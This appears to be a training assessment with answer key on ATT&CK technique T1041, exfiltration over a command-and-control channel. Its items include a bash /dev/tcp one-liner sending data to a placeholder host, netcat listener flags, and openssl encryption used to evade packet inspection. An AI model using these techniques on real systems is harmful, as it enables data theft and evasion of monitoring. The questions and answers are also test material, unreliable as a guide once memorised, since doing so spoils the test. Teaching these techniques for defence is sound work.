# T1041 – Exfiltration Over C2 Channel | Assessment

## MCQ 1
T1041 (Exfil over C2) differs from T1048 (Exfil over alternative protocol) because:
A) T1041 is faster  B) T1041 uses the same channel already established for C2 communication — no new connection needed  ✅
C) T1041 only uses HTTP  D) T1048 requires encryption

## MCQ 2
`bash -c 'data>/dev/tcp/host/port'` works because:
A) /dev/tcp is a real device file  B) Bash implements /dev/tcp as a built-in network pseudo-device for TCP connections  ✅
C) It requires netcat installed  D) It only works as root

## MCQ 3
Compressing data before exfiltration achieves:
A) Encryption of the data  B) Reduced transfer size (reducing anomalous bandwidth) and data obfuscation  ✅
C) Bypassing firewall inspection  D) Faster network speeds only

## Fill 1
netcat flag to listen, be verbose, resolve no names, and bind to a port:
**Answer:** `-lvnp <port>`

## Fill 2
`openssl enc -aes-256-cbc -k key` encrypts data for exfil to prevent:
**Answer:** Content inspection / DPI (Deep Packet Inspection) by network security tools
